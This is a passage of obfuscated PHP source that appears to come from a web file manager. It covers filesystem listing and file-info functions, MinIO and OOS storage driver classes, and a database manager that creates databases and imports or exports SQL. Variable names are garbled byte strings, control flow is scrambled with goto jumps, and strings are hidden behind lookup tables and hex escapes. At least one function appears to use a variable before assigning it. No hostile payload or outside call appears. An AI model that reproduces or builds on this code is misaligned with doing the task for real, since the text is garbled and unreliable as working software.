F‚ÉÔ≥ÌÉ±: $c°ÂîÁ°ï  = $this->iconvSystem($c°ÂîÁ°ï ); $B∏ëèìº£¨ = $this->pathFather($c°ÂîÁ°ï ); $e∂†∫ÚÈ”∞ = rtrim($B∏ëèìº£¨, $aƒ—¿À≥·¶[8]) . $aƒ—¿À≥·¶[8] . $A¯—‚íÔ£Á; goto eÊ≈ÜÉàû‘; f««∑áãù˜: } public function size($cñ•¨ÙóÀê) { $cñ•¨ÙóÀê = $this->iconvSystem($cñ•¨ÙóÀê); return filesize_64($cñ•¨ÙóÀê); } public function info($DﬂË´ı™Ç—) { $DﬂË´ı™Ç— = $this->iconvSystem($DﬂË´ı™Ç—); if ($this->isFolder($DﬂË´ı™Ç—)) { return $this->folderInfo($DﬂË´ı™Ç—); } else { if ($this->isFile($DﬂË´ı™Ç—)) { return $this->fileInfo($DﬂË´ı™Ç—); } } return !1; } protected function infoChildren($D÷≠∫Œ∏≈ë, &$dòíÜ¿›≥û, $AàÕ¯êõÙå = true) { goto C¡èËùÑΩ£; f’⁄Êê¡¨Ë: closedir($C‰Áòöâ·ı); goto Câ”ôôâ…ê; FÍãÂ◊Ê‹Ï: if ($AàÕ¯êõÙå) { $D÷≠∫Œ∏≈ë = $this->iconvSystem($D÷≠∫Œ∏≈ë); } if (!($C‰Áòöâ·ı = @opendir($D÷≠∫Œ∏≈ë))) { return; } while (($F†àëÖø÷§ = readdir($C‰Áòöâ·ı)) !== !1) { if ($F†àëÖø÷§ == $cù¨èËÖñÛ[95] || $F†àëÖø÷§ == $cù¨èËÖñÛ[1263]) { continue; } $b‚ÆûÃ˜Æ∑ = $D÷≠∫Œ∏≈ë . $F†àëÖø÷§; if (is_file($b‚ÆûÃ˜Æ∑) || is_link($b‚ÆûÃ˜Æ∑)) { $dòíÜ¿›≥û[$cù¨èËÖñÛ[79]]++; $dòíÜ¿›≥û[$cù¨èËÖñÛ[78]] += filesize_64($b‚ÆûÃ˜Æ∑); } else { if (is_dir($b‚ÆûÃ˜Æ∑)) { $dòíÜ¿›≥û[$cù¨èËÖñÛ[80]]++; $this->infoChildren($b‚ÆûÃ˜Æ∑, $dòíÜ¿›≥û, !1); } } } goto f’⁄Êê¡¨Ë; C¡èËùÑΩ£: $cù¨èËÖñÛ =& $_SERVER[Öíæ€“”≠éÏË]; check_abort_echo(); $D÷≠∫Œ∏≈ë = rtrim($D÷≠∫Œ∏≈ë, $cù¨èËÖñÛ[8]) . $cù¨èËÖñÛ[8]; goto FÍãÂ◊Ê‹Ï; Câ”ôôâ…ê: } private function folderInfo($BÎ¨°÷†ïÌ, $a—Êµ∞Ñªé = false) { $A≈‘Òƒá∆ê =& $_SERVER[Öíæ€“”≠éÏË]; $BÎ¨°÷†ïÌ = rtrim($BÎ¨°÷†ïÌ, $A≈‘Òƒá∆ê[8]) . $A≈‘Òƒá∆ê[8]; $eØ§πÖÌÕµ = $this->iconvApp($this->pathThis($BÎ¨°÷†ïÌ)); if ($a—Êµ∞Ñªé) { return array($A≈‘Òƒá∆ê[28] => $eØ§πÖÌÕµ, $A≈‘Òƒá∆ê[76] => $this->getPathOuter($BÎ¨°÷†ïÌ), $A≈‘Òƒá∆ê[29] => $A≈‘Òƒá∆ê[77]); } $aÑÕﬁå∆⁄ª = array($A≈‘Òƒá∆ê[28] => $eØ§πÖÌÕµ, $A≈‘Òƒá∆ê[76] => $this->getPathOuter($BÎ¨°÷†ïÌ), $A≈‘Òƒá∆ê[29] => $A≈‘Òƒá∆ê[77], $A≈‘Òƒá∆ê[194] => @filectime($BÎ¨°÷†ïÌ), $A≈‘Òƒá∆ê[84] => @filemtime($BÎ¨°÷†ïÌ), $A≈‘Òƒá∆ê[1266] => @fileatime($BÎ¨°÷†ïÌ), $A≈‘Òƒá∆ê[1267] => is_readable($BÎ¨°÷†ïÌ), $A≈‘Òƒá∆ê[1268] => is_writable($BÎ¨°÷†ïÌ), $A≈‘Òƒá∆ê[1269] => get_mode($BÎ¨°÷†ïÌ)); return $aÑÕﬁå∆⁄ª; } private function fileInfo($E≈„ßèƒ∏, $aí©®ÈèÇÖ = false) { $BëóªÑΩ⁄Ö =& $_SERVER[Öíæ€“”≠éÏË]; $d§¶Èò÷ﬂÿ = $this->iconvApp($this->pathThis($E≈„ßèƒ∏)); if ($aí©®ÈèÇÖ) { return array($BëóªÑΩ⁄Ö[28] => $d§¶Èò÷ﬂÿ, $BëóªÑΩ⁄Ö[76] => $this->getPathOuter($E≈„ßèƒ∏), $BëóªÑΩ⁄Ö[29] => $BëóªÑΩ⁄Ö[193], $BëóªÑΩ⁄Ö[78] => $this->size($E≈„ßèƒ∏), $BëóªÑΩ⁄Ö[168] => $this->ext($d§¶Èò÷ﬂÿ)); } $b¢ÁŒ™›Á´ = array($BëóªÑΩ⁄Ö[28] => $d§¶Èò÷ﬂÿ, $BëóªÑΩ⁄Ö[76] => $this->getPathOuter($E≈„ßèƒ∏), $BëóªÑΩ⁄Ö[29] => $BëóªÑΩ⁄Ö[193], $BëóªÑΩ⁄Ö[194] => @filectime($E≈„ßèƒ∏), $BëóªÑΩ⁄Ö[84] => @filemtime($E≈„ßèƒ∏), $BëóªÑΩ⁄Ö[1266] => @fileatime($E≈„ßèƒ∏), $BëóªÑΩ⁄Ö[78] => $this->size($E≈„ßèƒ∏), $BëóªÑΩ⁄Ö[168] => $this->ext($d§¶Èò÷ﬂÿ), $BëóªÑΩ⁄Ö[1267] => is_readable($E≈„ßèƒ∏), $BëóªÑΩ⁄Ö[1268] => is_writable($E≈„ßèƒ∏), $BëóªÑΩ⁄Ö[1269] => get_mode($E≈„ßèƒ∏)); return $b¢ÁŒ™›Á´; } public function exist($d∏ÀÇ Ωãê) { $d∏ÀÇ Ωãê = $this->iconvSystem($d∏ÀÇ Ωãê); return @file_exists($d∏ÀÇ Ωãê); } public function isFile($AªÀπë«£ß) { $AªÀπë«£ß = $this->iconvSystem($AªÀπë«£ß); return @is_file($AªÀπë«£ß); } public function isFolder($aˆû€¿÷œè) { $aˆû€¿÷œè = $this->iconvSystem($aˆû€¿÷œè); return @is_dir($aˆû€¿÷œè); } public function listPath($fëÚø‡Ïá¶, $bß∫ŒÛπ±¢ = false) { goto fõä±ıÑ∫è; DãÖÎÖÍëâ: closedir($D∂πê∞â˘⁄); return $Bı‰·ÊæÒã; goto CÂπﬂ®‚§É; a¡îËå÷çû: $Bı‰·ÊæÒã = array($D¡≤éﬂ™™ú[75] => array(), $D¡≤éﬂ™™ú[74] => array()); if (!($D∂πê∞â˘⁄ = @opendir($fëÚø‡Ïá¶))) { return $Bı‰·ÊæÒã; } while (($Dı¬ €®Ò£ = readdir($D∂πê∞â˘⁄)) !== !1) { if ($Dı¬ €®Ò£ == $D¡≤éﬂ™™ú[95] || $Dı¬ €®Ò£ == $D¡≤éﬂ™™ú[1263]) { continue; } $f⁄ÑŸıÓÎ‰ = $fëÚø‡Ïá¶ . $Dı¬ €®Ò£; if (is_file($f⁄ÑŸıÓÎ‰)) { $Bı‰·ÊæÒã[$D¡≤éﬂ™™ú[74]][] = $this->fileInfo($f⁄ÑŸıÓÎ‰, $bß∫ŒÛπ±¢); } else { $Bı‰·ÊæÒã[$D¡≤éﬂ™™ú[75]][] = $this->folderInfo($f⁄ÑŸıÓÎ‰, $bß∫ŒÛπ±¢); } } goto DãÖÎÖÍëâ; fõä±ıÑ∫è: $D¡≤éﬂ™™ú =& $_SERVER[Öíæ€“”≠éÏË]; $fëÚø‡Ïá¶ = $this->iconvSystem($fëÚø‡Ïá¶); $fëÚø‡Ïá¶ = rtrim($fëÚø‡Ïá¶, $D¡≤éﬂ™™ú[8]) . $D¡≤éﬂ™™ú[8]; goto a¡îËå÷çû; CÂπﬂ®‚§É: } public function listAll($a¿•¡í¡åÈ, &$Aæò—™Õå = array()) { goto bÛÔØóºÚ; AÖœÖ÷Â√ƒ: if (!($fÁ—ÖŸ“— = @opendir($a¿•¡í¡åÈ))) { return $Aæò—™Õå; } while (($Eáæä£Ó£ã = readdir($fÁ—ÖŸ“—)) !== !1) { if ($Eáæä£Ó£ã == $cêî¶”∆ïà[95] || $Eáæä£Ó£ã == $cêî¶”∆ïà[1263]) { continue; } $E’òæ«’è› = $a¿•¡í¡åÈ . $Eáæä£Ó£ã; if (is_dir($E’òæ«’è›) && !is_link($E’òæ«’è›)) { $Aæò—™Õå[] = array($cêî¶”∆ïà[76] => $E’òæ«’è› . $cêî¶”∆ïà[8], $cêî¶”∆ïà[77] => 1, $cêî¶”∆ïà[84] => @filemtime($E’òæ«’è›), $cêî¶”∆ïà[78] => 0); $this->listAll($E’òæ«’è›, $Aæò—™Õå); } else { $Aæò—™Õå[] = array($cêî¶”∆ïà[76] => $E’òæ«’è›, $cêî¶”∆ïà[77] => 0, $cêî¶”∆ïà[84] => @filemtime($E’òæ«’è›), $cêî¶”∆ïà[78] => $this->size($E’òæ«’è›)); } } closedir($fÁ—ÖŸ“—); goto DÀÂ´±äË; bÛÔØóºÚ: $cêî¶”∆ïà =& $_SERVER[Öíæ€“”≠éÏË]; $a¿•¡í¡åÈ = $this->iconvSystem($a¿•¡í¡åÈ); $a¿•¡í¡åÈ = rtrim($a¿•¡í¡åÈ, $cêî¶”∆ïà[8]) . $cêî¶”∆ïà[8]; goto AÖœÖ÷Â√ƒ; DÀÂ´±äË: return $Aæò—™Õå; goto FùÇ≤„À∆±; FùÇ≤„À∆±: } public function has($bÛÈﬁÿÒ˘©, $E“Ôí’·Æ€ = false, $dº‹§¥ÃÜ√ = true) { goto d‡’˜…Ë∞∞; e≥õ·Í´¡±: $eÉ∆ªπª∆π = 0; while (($cÖ·Áµ›¡Í = readdir($E≈ﬁ”∂»Ú›)) !== !1) { if ($cÖ·Áµ›¡Í == $bÑÒ£⁄Ûå§[95] || $cÖ·Áµ›¡Í == $bÑÒ£⁄Ûå§[1263]) { continue; } $fµòöê∫è— = $bÛÈﬁÿÒ˘© . $cÖ·Áµ›¡Í; if ($E“Ôí’·Æ€) { $eÉ∆ªπª∆π++; if (@is_file($fµòöê∫è—)) { $EåƒÕìëò—++; } else { $dÃåÿÿÏåÂ++; } if ($eÉ∆ªπª∆π > 10000) { break; } continue; } if ($dº‹§¥ÃÜ√) { if (@is_file($fµòöê∫è—)) { return !0; } } else { if (@is_dir($fµòöê∫è— . $bÑÒ£⁄Ûå§[8])) { return !0; } } } closedir($E≈ﬁ”∂»Ú›); goto E ﬂä…¢ãÎ; d‡’˜…Ë∞∞: $bÑÒ£⁄Ûå§ =& $_SERVER[Öíæ€“”≠éÏË]; $bÛÈﬁÿÒ˘© = $this->iconvSystem($bÛÈﬁÿÒ˘©); $bÛÈﬁÿÒ˘© = rtrim($bÛÈﬁÿÒ˘©, $bÑÒ£⁄Ûå§[8]) . $bÑÒ£⁄Ûå§[8]; goto Cú∂Ïºæ›√; E ﬂä…¢ãÎ: if ($E“Ôí’·Æ€) { return array($bÑÒ£⁄Ûå§[203] => $EåƒÕìëò—, $bÑÒ£⁄Ûå§[204] => $dÃåÿÿÏåÂ); } return !1; goto F¡Ωﬁï·„ê; Cú∂Ïºæ›√: if (!($E≈ﬁ”∂»Ú› = @opendir($bÛÈﬁÿÒ˘©))) { return !1; } $EåƒÕìëò— = 0; $dÃåÿÿÏåÂ = 0; goto e≥õ·Í´¡±; F¡Ωﬁï·„ê: } public function hashSimple($aÓ≤à®çÇﬂ) { goto aÎ√ÖÂóëï; aÎ√ÖÂóëï: $A√ËÙıñá° =& $_SERVER[Öíæ€“”≠éÏË]; if (!$aÓ≤à®çÇﬂ) { return md5($A√ËÙıñá°[33]); } $aÓ≤à®çÇﬂ = $this->iconvSystem($aÓ≤à®çÇﬂ); goto D≤ÌõÇäÜ; dú¢òã¢î‰: return md5($D”¬Ò•–‡Ë) . $bÃπÃ›£∑Ì; goto DíÆ¨√∂ﬂ∫; E¨èπÕÈ¿í: $Bïùº±Ö†â = fopen($aÓ≤à®çÇﬂ, $A√ËÙıñá°[1270]); if (!$Bïùº±Ö†â) { return $D”¬Ò•–‡Ë; } for ($a∏î⁄áÈ„∞ = 0; $a∏î⁄áÈ„∞ < $e∏‘…éùÿÊ; $a∏î⁄áÈ„∞++) { fseek_64($Bïùº±Ö†â, $a¬‹‡Æ”í÷ * $a∏î⁄áÈ„∞); $D”¬Ò•–‡Ë .= fread($Bïùº±Ö†â, $cì€›ú√ïÀ); } goto Aƒ»¬√Áõô; D©µ§óÕÖÜ: if ($bÃπÃ›£∑Ì <= $cì€›ú√ïÀ * $e∏‘…éùÿÊ) { return $this->hashMd5($aÓ≤à®çÇﬂ) . $bÃπÃ›£∑Ì; } $D”¬Ò•–‡Ë = $A√ËÙıñá°[33]; $a¬‹‡Æ”í÷ = intval($bÃπÃ›£∑Ì / $e∏‘…éùÿÊ); goto E¨èπÕÈ¿í; D≤ÌõÇäÜ: $bÃπÃ›£∑Ì = $this->size($aÓ≤à®çÇﬂ); $cì€›ú√ïÀ = 200; $e∏‘…éùÿÊ = 50; goto D©µ§óÕÖÜ; Aƒ»¬√Áõô: fseek_64($Bïùº±Ö†â, $bÃπÃ›£∑Ì - $cì€›ú√ïÀ); $D”¬Ò•–‡Ë .= fread($Bïùº±Ö†â, $cì€›ú√ïÀ); fclose($Bïùº±Ö†â); goto dú¢òã¢î‰; DíÆ¨√∂ﬂ∫: } public function getContent($fº—ú¬Êùº) { $fº—ú¬Êùº = $this->iconvSystem($fº—ú¬Êùº); return file_get_contents($fº—ú¬Êùº); } public function setContent($D¨àîìº›è, $aÏêèŒºø = '') { $D¨àîìº›è = $this->iconvSystem($D¨àîìº›è); $fàÃ”¯–áÍ = @file_put_contents($D¨àîìº›è, $aÏêèŒºø, LOCK_EX); clearstatcache(); @chmod($D¨àîìº›è, 511); return $fàÃ”¯–áÍ === !1 ? !1 : !0; } public function fileSubstr($a ˘“«Éƒã, $d≈Ü•ãùãÏ = 0, $A∫¯√‡ûûÁ = false) { goto e•™®âﬂßÂ; e•™®âﬂßÂ: $d—ﬁ´≥™ºÉ =& $_SERVER[Öíæ€“”≠éÏË]; $a ˘“«Éƒã = $this->iconvSystem($a ˘“«Éƒã); if ($A∫¯√‡ûûÁ === !1) { $A∫¯√‡ûûÁ = $this->size($a ˘“«Éƒã); } goto e‚Ñ†Ù ¿ª; Dïπû≈¯¢ô: return $dàﬂ∂Ç¶°Ù; goto E∏ÃÇ∫ªæÔ; e‚ú¿‹˜Óæ: fseek_64($A‹á”œà¢ö, $d≈Ü•ãùãÏ); $dàﬂ∂Ç¶°Ù = fread($A‹á”œà¢ö, $A∫¯√‡ûûÁ); fclose($A‹á”œà¢ö); goto Dïπû≈¯¢ô; e‚Ñ†Ù ¿ª: if ($A∫¯√‡ûûÁ <= 0) { return $d—ﬁ´≥™ºÉ[33]; } $A‹á”œà¢ö = fopen($a ˘“«Éƒã, $d—ﬁ´≥™ºÉ[1270]); if (!$A‹á”œà¢ö) { return !1; } goto e‚ú¿‹˜Óæ; E∏ÃÇ∫ªæÔ: } public function upload($CåÑ†±°âÑ, $fçàåπçòÁ, $D⁄˘á¿ñÜ˜ = false, $Aöìƒâ≠ = REPEAT_REPLACE) { if ($D⁄˘á¿ñÜ˜) { return $this->moveFile($fçàåπçòÁ, $CåÑ†±°âÑ); } return $this->copyFile($fçàåπçòÁ, $CåÑ†±°âÑ); } public function setModifyTime($eº¶‚¶∑ì¿, $BäûêΩ£è‰ = '') { @touch($eº¶‚¶∑ì¿, intval($BäûêΩ£è‰)); } public function download($Eñ““ äë∫, $a≈√ëÀœó®) { return $this->iconvSystem($Eñ““ äë∫); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($b§™ÑÊ¥∫Ø) { parent::__construct($b§™ÑÊ¥∫Ø); $this->signatureVersion($_SERVER[Öíæ€“”≠éÏË][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($CùÏ¯ùÍË¨) { parent::__construct($CùÏ¯ùÍË¨); $this->signatureVersion($_SERVER[Öíæ€“”≠éÏË][212]); } public function fileOutLink($A˜Ìøùë©à) { $bËú∫öàÚÏ =& $_SERVER[Öíæ€“”≠éÏË]; if (substr($A˜Ìøùë©à, 0, 7) == $bËú∫öàÚÏ[1213]) { $A˜Ìøùë©à = $bËú∫öàÚÏ[1214] . substr($A˜Ìøùë©à, 7); } header($bËú∫öàÚÏ[159] . $A˜Ìøùë©à); die; } } goto E◊÷Íà¬‘⁄; eêàÇÀÀ√”: class DbManage { function __construct($e≈¢±çù—Ë, $e„˜†¿‹¥’ = '') { $this->database = $e≈¢±çù—Ë; $this->type = $e„˜†¿‹¥’; } public function model($FΩπ óãõ† = '') { return new ModelBase($FΩπ óãõ†, $_SERVER[Öíæ€“”≠éÏË][33], $this->database); } public function db($D±˜Õà–ã• = false) { goto cÃøÑâÚ¡ÿ; AêŸÉëå≥à: $Aﬂ∏åÿÉÁß = $dÁÍ‘Í§∫[$aÛôë∞æŒë[940]]; $dÁÍ‘Í§∫[$aÛôë∞æŒë[940]] = $aÛôë∞æŒë[33]; if ($dÁÍ‘Í§∫[$aÛôë∞æŒë[767]] == $aÛôë∞æŒë[768]) { $f◊›∞±≠Î• = $dÁÍ‘Í§∫[$aÛôë∞æŒë[769]]; $dÁÍ‘Í§∫[$aÛôë∞æŒë[769]] = substr($f◊›∞±≠Î•, 0, strrpos($f◊›∞±≠Î•, $aÛôë∞æŒë[1027])); } goto Båç∂òÎçÈ; cÃøÑâÚ¡ÿ: $aÛôë∞æŒë =& $_SERVER[Öíæ€“”≠éÏË]; $dÁÍ‘Í§∫ = array_change_key_case($this->database); if ($this->type == $aÛôë∞æŒë[9] || !$D±˜Õà–ã•) { return $this->model()->db(); } goto AêŸÉëå≥à; bªÃˆ∫‰‡∂: if (!$B≈Ñàñ¶¬ê) { $Cø¶ÖÁ°Ú–->execute("\x63\162\145\x61\164\x65\x20\x64\x61\x74\141\142\141\163\145\x20\x60{$Aﬂ∏åÿÉÁß}\140"); } $dÁÍ‘Í§∫[$aÛôë∞æŒë[940]] = $Aﬂ∏åÿÉÁß; if ($dÁÍ‘Í§∫[$aÛôë∞æŒë[767]] == $aÛôë∞æŒë[768]) { $dÁÍ‘Í§∫[$aÛôë∞æŒë[769]] .= $aÛôë∞æŒë[1027] . $Aﬂ∏åÿÉÁß; } goto fÕûòêöªö; fÕûòêöªö: $this->database = $dÁÍ‘Í§∫; $Cø¶ÖÁ°Ú–->execute("\x75\163\x65\x20\x60{$Aﬂ∏åÿÉÁß}\140"); return $Cø¶ÖÁ°Ú–; goto EÜÑ«èî£›; Båç∂òÎçÈ: $this->database = $dÁÍ‘Í§∫; $Cø¶ÖÁ°Ú– = $this->model()->db(); try { $B≈Ñàñ¶¬ê = $Cø¶ÖÁ°Ú–->execute("\x73\150\157\x77\40\x64\x61\164\141\x62\x61\163\145\x73\x20\x6c\151\x6b\145\x20\x27{$Aﬂ∏åÿÉÁß}\x27"); } catch (Exception $E«ÎºôÙ”ƒ) { } goto bªÃˆ∫‰‡∂; EÜÑ«èî£›: } public function createTable($CÛ∑√»öõÖ, $F∫ÂÀˆù¬© = null) { $A›èﬂ·ü‚ó =& $_SERVER[Öíæ€“”≠éÏË]; if (!IO::exist($CÛ∑√»öõÖ)) { ActionCall($A›èﬂ·ü‚ó[1028], !0, 0); show_json(LNG($A›èﬂ·ü‚ó[1029]), !1); } $Dçêﬂ≠ëÜÉ = sqlSplit(IO::getContent($CÛ∑√»öõÖ)); foreach ($Dçêﬂ≠ëÜÉ as $f≤óˆııòÕ) { if ($F∫ÂÀˆù¬©) { $DäÉ·çøá‹ = stripos($f≤óˆııòÕ, $A›èﬂ·ü‚ó[1030]) === 0; if ($DäÉ·çøá‹) { $F∫ÂÀˆù¬©->task[$A›èﬂ·ü‚ó[1031]] += 1; } } $this->model()->db()->execute($f≤óˆııòÕ); if ($F∫ÂÀˆù¬© && $DäÉ·çøá‹) { preg_match($A›èﬂ·ü‚ó[1032], $f≤óˆııòÕ, $F´ÖÃÜΩ«ı); $F∫ÂÀˆù¬©->task[$A›èﬂ·ü‚ó[1033]] = $F´ÖÃÜΩ«ı[1]; $F∫ÂÀˆù¬©->update(1); } } $this->taskToCache($F∫ÂÀˆù¬©); } public function insertTable($dÌÛ“À⁄ä≤, $BÍÙ†Îñè« = null) { $DßÃª◊·±¥ =& $_SERVER[Öíæ€“”≠éÏË]; $B®úœêÁ∞À = $this->model()->db(); $e“Ù–É∞òæ = $cΩÁ∑ÀÔπ∆ ? array($cΩÁ∑ÀÔπ∆) : $B®úœêÁ∞À->getTables(); foreach ($dÌÛ“À⁄ä≤ as $F…®…àƒìè) { $cΩÁ∑ÀÔπ∆ = basename($F…®…àƒìè, $DßÃª◊·±¥[759]); if (!in_array($cΩÁ∑ÀÔπ∆, $e“Ù–É∞òæ)) { continue; } if ($BÍÙ†Îñè«) { $BÍÙ†Îñè«->task[$DßÃª◊·±¥[1033]] = $cΩÁ∑ÀÔπ∆; } if (get_filesize($F…®…àƒìè) == 0) { continue; } $a◊ê≥™Ë˜ê = $this->sqlToDb($F…®…àƒìè, $BÍÙ†Îñè«); if (!$a◊ê≥™Ë˜ê) { ActionCall($DßÃª◊·±¥[1028], !0, 0); show_json(LNG($DßÃª◊·±¥[1034]) . "\x5b{$cΩÁ∑ÀÔπ∆}\135", !1); } } $this->taskToCache($BÍÙ†Îñè«); } public function sqlFromDb($F’ÙàÓﬁ®í, $A◊îº∫◊Ÿ—, $Fπ ÊÜÜÔÔ = null, $dÀ≠‰”ﬁ¿Ü = null) { goto DòÚ£åí…ﬁ; DòÚ£åí…ﬁ: if ($Fπ ÊÜÜÔÔ) { $Fπ ÊÜÜÔÔ->task[$_SERVER[Öíæ€“”≠éÏË][1033]] = $F’ÙàÓﬁ®í; } $f£˜≠’∫◊· = $this->model($F’ÙàÓﬁ®í); $a’–ﬁµå≠≈ = 0; goto fÖ§ÉßÚãä; fÖ§ÉßÚãä: $cï∑ÉÖ»öÇ = 0; $dπ√çÕº¯í = 10000; $c´÷§‘∞µ« = fopen($A◊îº∫◊Ÿ—, $_SERVER[Öíæ€“”≠éÏË][1035]); goto d≠πûÑÓˆó; CçúÚÌÇçÌ: fclose($c´÷§‘∞µ«); return $a’–ﬁµå≠≈; goto F«é°Éó®®; d≠πûÑÓˆó: $E“µÍ∏—·ö = $f£˜≠’∫◊·->getPk(); $fÛæï£‹ª˘ = $f£˜≠’∫◊·->getDbFields(); do { $A å™íÃÈÂ = array($E“µÍ∏—·ö => array($_SERVER[Öíæ€“”≠éÏË][982], $cï∑ÉÖ»öÇ)); $E—–Óö”‹† = $f£˜≠’∫◊·->where($A å™íÃÈÂ)->field($fÛæï£‹ª˘)->order($E“µÍ∏—·ö . $_SERVER[Öíæ€“”≠éÏË][1036])->limit($dπ√çÕº¯í)->select(); $E—–Óö”‹† = !empty($E—–Óö”‹†) ? $E—–Óö”‹† : array(); if (!($bÈñ≈πùˆõ = count($E—–Óö”‹†))) { break; } $B‡üäˆãÇè = end($E—–Óö”‹†); $cï∑ÉÖ»öÇ = $B‡üäˆãÇè[$E“µÍ∏—·ö]; $e¯¢Œìóéç = array(); foreach ($E—–Óö”‹† as $AåèÏ£ÀÊ¢) { if ($F’ÙàÓﬁ®í == $_SERVER[Öíæ€“”≠éÏË][1037] && $AåèÏ£ÀÊ¢[$_SERVER[Öíæ€“”≠éÏË][29]] == $_SERVER[Öíæ€“”≠éÏË][1038]) { $FÛìîΩçŒà = json_decode($AåèÏ£ÀÊ¢[$_SERVER[Öíæ€“”≠éÏË][372]], !0); if ($FÛìîΩçŒà[$_SERVER[Öíæ€“”≠éÏË][28]] == date($_SERVER[Öíæ€“”≠éÏË][724]) && !$FÛìîΩçŒà[$_SERVER[Öíæ€“”≠éÏË][723]]) { continue; } } if ($dÀ≠‰”ﬁ¿Ü) { $AåèÏ£ÀÊ¢[$_SERVER[Öíæ€“”≠éÏË][76]] = "\173\x69\x6f\x3a{$dÀ≠‰”ﬁ¿Ü}\x7d" . substr($AåèÏ£ÀÊ¢[$_SERVER[Öíæ€“”≠éÏË][76]], strlen("\x7b\x69\x6f\x3a{$AåèÏ£ÀÊ¢[$_SERVER[Öíæ€“”≠éÏË][795]]}\x7d")); $AåèÏ£ÀÊ¢[$_SERVER[Öíæ€“”≠éÏË][795]] = $dÀ≠‰”ﬁ¿Ü; } $e¯¢Œìóéç[] = $_SERVER[Öíæ€“”≠éÏË][1039] . $this->sqlEncode($AåèÏ£ÀÊ¢) . $_SERVER[Öíæ€“”≠éÏË][1040]; } $aõçèêÂÖ‡ = "\111\116\x53\105\x52\x54\x20\111\x4e\x54\x4f\x20\x60{$F’ÙàÓﬁ®í}\x60\40\x28\140" . implode($_SERVER[Öíæ€“”≠éÏË][1041], $fÛæï£‹ª˘) . $_SERVER[Öíæ€“”≠éÏË][1042]; fwrite($c´÷§‘∞µ«, $aõçèêÂÖ‡ . implode($_SERVER[Öíæ€“”≠éÏË][1043], $e¯¢Œìóéç) . $_SERVER[Öíæ€“”≠éÏË][68] . PHP_EOL); $a’–ﬁµå≠≈ += $bÈñ≈πùˆõ; if ($Fπ ÊÜÜÔÔ) { $Fπ ÊÜÜÔÔ->update($bÈñ≈πùˆõ); } } while ($dπ√çÕº¯í == $bÈñ≈πùˆõ); goto CçúÚÌÇçÌ; F«é°Éó®®: } public function sqlToDb($eâ¶ô‚úÓµ, $Dé≤˘Éò·Ô = null) { goto EÊûÚª√È¡; fÓ◊ÓÜâÔ“: return !0; goto bÈı’ÁùáÔ; aò—Á’‹îò: if (!$bâ¶ÒÒ‘å†) { return !1; } $aΩîÑúÃÃÃ = 0; $A‘±◊¡ß¬≈ = $d–æÜ√ØîÍ[33]; goto EÃ∂à÷«ﬂ◊; EÊûÚª√È¡: $d–æÜ√ØîÍ =& $_SERVER[Öíæ€“”≠éÏË]; $CÏèΩπÖá± = $this->model()->db(); $bâ¶ÒÒ‘å† = @fopen($eâ¶ô‚úÓµ, $d–æÜ√ØîÍ[1044]); goto aò—Á’‹îò; a∫ø˘‚ËÙê: $c˜÷Ω≠„ÿå = 0; $CÆÇ‚«°êÊ = 4194304 - 104858; $dóæï‘Ë∞ñ = 1000000 - 104858; goto AùÀ—¥àïá; AùÀ—¥àïá: while (!feof($bâ¶ÒÒ‘å†)) { $C∆û™”œõ’ = trim(fgets($bâ¶ÒÒ‘å†)); if (!$C∆û™”œõ’) { continue; } $AºÚ≤âüî≈ = $this->sqlDecode($C∆û™”œõ’, $this->type); if (stripos($AºÚ≤âüî≈, $d–æÜ√ØîÍ[353]) === 0) { if (!$A‘±◊¡ß¬≈) { $A‘±◊¡ß¬≈ = $AºÚ≤âüî≈ . $d–æÜ√ØîÍ[50]; } continue; } if ($Dé≤˘Éò·Ô) { $Dé≤˘Éò·Ô->task[$d–æÜ√ØîÍ[1031]] += 1; } $aΩîÑúÃÃÃ++; $Dƒ≠›àƒªË[] = rtrim(rtrim(trim($AºÚ≤âüî≈), $d–æÜ√ØîÍ[47]), $d–æÜ√ØîÍ[68]); $dªÇ∆‡∏œÁ = null; $E√ÀŒâ∆∑î = strlen($AºÚ≤âüî≈); $c˜÷Ω≠„ÿå += $E√ÀŒâ∆∑î; if ($c˜÷Ω≠„ÿå >= ($DŒîåÖ√ÚÜ == 500 ? $CÆÇ‚«°êÊ : $dóæï‘Ë∞ñ)) { $dªÇ∆‡∏œÁ = array_pop($Dƒ≠›àƒªË); if ($aΩîÑúÃÃÃ > 1) { $aΩîÑúÃÃÃ--; } } if ($aΩîÑúÃÃÃ >= $DŒîåÖ√ÚÜ || $dªÇ∆‡∏œÁ) { goto bî∞Ïö…•¢; fÌÚÍ∞ﬁÉô: $Dƒ≠›àƒªË = array(); $aΩîÑúÃÃÃ = 0; $c˜÷Ω≠„ÿå = 0; goto aâëóÆùØ¢; aâëóÆùØ¢: if ($dªÇ∆‡∏œÁ) { $Dƒ≠›àƒªË = array($dªÇ∆‡∏œÁ); $aΩîÑúÃÃÃ = 1; $c˜÷Ω≠„ÿå = $E√ÀŒâ∆∑î; } goto aâ§¯≤‡òä; bî∞Ïö…•¢: $AºÚ≤âüî≈ = $A‘±◊¡ß¬≈ . implode($d–æÜ√ØîÍ[47], $Dƒ≠›àƒªË); if (!$CÏèΩπÖá±->execute($AºÚ≤âüî≈)) { return !1; } if ($Dé≤˘Éò·Ô) { $Dé≤˘Éò·Ô->update($aΩîÑúÃÃÃ); } goto fÌÚÍ∞ﬁÉô; aâ§¯≤‡òä: } } fclose($bâ¶ÒÒ‘å†); if (!empty($Dƒ≠›àƒªË)) { $AºÚ≤âüî≈ = $A‘±◊¡ß¬≈ . implode($d–æÜ√ØîÍ[47], $Dƒ≠›àƒªË); if (!$CÏèΩπÖá±->execute($AºÚ≤âüî≈)) { return !1; } if ($Dé≤˘Éò·Ô) { $Dé≤˘Éò·Ô->update($aΩîÑúÃÃÃ); } } goto fÓ◊ÓÜâÔ“; EÃ∂à÷«ﬂ◊: $Dƒ≠›àƒªË = array(); $DŒîåÖ√ÚÜ = $this->type == $d–æÜ√ØîÍ[9] ? 500 : 2000; $Cê≈™ÍÒ∞œ = basename($eâ¶ô‚úÓµ, $d–æÜ√ØîÍ[759]); goto a∫ø˘‚ËÙê; bÈı’ÁùáÔ: } public function dropTable($eÁ°π‡Áêí = null) { $C€Ï˜Ÿ‚’Ú = $this->model()->db(); $EöÏôÔÍæà = $eÁ°π‡Áêí ? array($eÁ°π‡Áêí) : $C€Ï˜Ÿ‚’Ú->getTables(); if (!$EöÏôÔÍæà) { return; } foreach ($EöÏôÔÍæà as $eÁ°π‡Áêí) { if 